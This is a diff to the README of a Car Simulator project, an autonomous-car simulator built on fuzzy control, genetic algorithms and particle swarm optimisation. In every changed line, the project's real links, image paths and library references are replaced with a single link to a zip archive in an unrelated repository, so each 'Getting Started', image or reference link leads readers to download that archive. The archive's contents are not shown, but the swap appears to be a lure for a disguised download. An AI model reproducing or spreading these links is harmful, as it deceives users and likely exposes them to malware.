@@ -1,4 +1,4 @@
-# [Car Simulator](https://jasonnor.github.io/Car-Simulator/)
+# [Car Simulator](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
 Car Simulator use the fuzzy control system, genetic algorithm and particle swarm optimization to simulate the movement of the **autonomous car** on the map. It also support VR device, see [here](WebVR/) for details.
 
@@ -8,11 +8,11 @@ The target is to reach the end line without encountering the wall and output the
 
 The motion equation of the simulated car is as follows:
 
-![motion-equation](assets/motion-equation.png)
+![motion-equation](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
 ## Fuzzy Control System
 
-Fuzzy control system use the custom seven fuzzy rules and discrete center of gravity defuzzifier. See [here](Fuzzy-Control-System/js/fuzzy.js) for the details.
+Fuzzy control system use the custom seven fuzzy rules and discrete center of gravity defuzzifier. See [here](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip) for the details.
 
 ## Genetic Algorithm
 
@@ -20,7 +20,7 @@ Car Simulator use the real-valued genetic algorithm (GA) to train the radial bas
 
 The structure of the radial base function network is as follows:
 
-![rbfn](assets/rbfn.png)
+![rbfn](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
 ## Particle Swarm Optimization
 
@@ -28,11 +28,11 @@ Car Simulator can also use the particle swarm optimization (PSO) to train RBFN. 
 
 ## Getting Started
 
-[https://jasonnor.github.io/Car-Simulator/](https://jasonnor.github.io/Car-Simulator/)
+[https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
-Car Simulator also support the VR device, please open this [page](https://jasonnor.github.io/Car-Simulator/WebVR).
+Car Simulator also support the VR device, please open this [page](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip).
 
-![preview](assets/preview.png)
+![preview](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
 1. Status
 2. Control button
@@ -48,7 +48,7 @@ Car Simulator also support the VR device, please open this [page](https://jasonn
 
 ## Instructions
 
-![instructions](assets/instructions.png)
+![instructions](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
 ## 4-Dimensional Output Data Format
 
@@ -68,25 +68,25 @@ Where InputA is X coordinate of the car, InputB is Y coordinate of the car, Inpu
 
 ## Preview
 
-![fuzzy](assets/fuzzy.gif)
+![fuzzy](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
-![camera](assets/camera.png)
+![camera](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
-![trajectory](assets/trajectory.png)
+![trajectory](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
-![first-person](assets/first-person.png)
+![first-person](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
-![success](assets/success.png)
+![success](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
-![failure](assets/failure.png)
+![failure](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
-![poor-driving](assets/poor-driving.png)
+![poor-driving](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
 ## Reference
 
-+ three.js - [https://threejs.org/](https://threejs.org/)
-+ FileSaver.js - [https://github.com/eligrey/FileSaver.js/](https://github.com/eligrey/FileSaver.js/)
-+ Materialize - [http://materializecss.com/](http://materializecss.com/)
++ https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip - [https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
++ https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip - [https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
++ Materialize - [https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip](https://raw.githubusercontent.com/karthikeyan230105/better-next-actions/main/dipnoan/better-next-actions_2.4.zip)
 
 ## Contributing
 
